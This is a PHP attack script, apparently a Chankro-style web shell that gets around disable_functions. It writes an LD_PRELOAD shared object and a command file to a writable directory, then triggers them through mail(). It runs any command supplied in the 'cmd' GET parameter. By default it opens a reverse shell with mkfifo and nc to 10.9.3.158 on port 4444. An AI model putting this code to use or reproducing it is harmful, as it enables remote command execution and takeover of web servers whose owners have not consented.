<?php
$hook_32 = '';
$hook_64 = '';
$hook = NULL;
$arch = NULL;
// determine architecture on target
if (php_uname('m')) {
  $unam = php_uname('m');
  $arch = ($unam == 'x86_64' || $unam == 'amd64')? '64' : (($unam == 'i686' || $unam == 'i386')? '32' : '');
}
if ($arch == '' || $arch == NULL) {
  if (array_key_exists("arch", $_GET)) {
    $arch = $_GET["arch"];
	  echo $arch;
    if (!($arch == "32" || $arch == "64")) {
      echo 'Architecture "' . $_GET["arch"] . '" unknown. Choose from 32 or 64 (or compile hook.so from source on target architecture).</br>';
   }
} else {
    if ($arch == '') {
      echo 'Architecture "' . $arch . '" (reported from php_uname()) didn`t match. Please spacify (32/64) in GET parameter (e.g. /?arch=64) or compile hook.so from source on target architecture.)</br>';
    } else {
      echo 'Please spacify architrcture (32/64) in GET parameter (e.g. /?arch=64) or compile hook.so from source on target architecture.)</br>';
    }
  }
}
// assigning hook.so according to architecture
if ($arch == "32") {
	$hook = $hook_32;
} elseif ($arch == "64") {
    $hook = $hook_64;
} else {
	exit();
}
// determine the current working directory (or any writeable directory)
$cwd = '';
if (function_exists('getcwd')){
	$cwd = getcwd();
} elseif (function_exists('dirname')){
	$cwd = dirname(__FILE__);
} elseif (array_key_exists("cwd", $_GET)) {
	$cwd = htmlspecialchars($_GET["cwd"]);
} else {
	echo 'Please specify a writeable working directory in GET parameter (?cwd=/path/to/dir)</br>';	
	echo 'Trying it with /tmp for now.</br>';
	$cwd = '/tmp';
}
// payload
$payload = NULL;
if (array_key_exists("cmd", $_GET)) {
	// url encoded please!
	$payload = $_GET["cmd"];
} else {
	$payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.3.158 4444 >/tmp/f';
}
// placing evil files
$path_chan = $cwd . '/chankro.so';
$path_sock = $cwd . '/acpid.socket';
file_put_contents($path_chan, base64_decode($hook));
file_put_contents($path_sock, $payload);
// setting evil environment variables
putenv('CHANKRO=' . $path_sock);
putenv('LD_PRELOAD=' . $path_chan);
// fire
mail('a','a','a','a');
?>
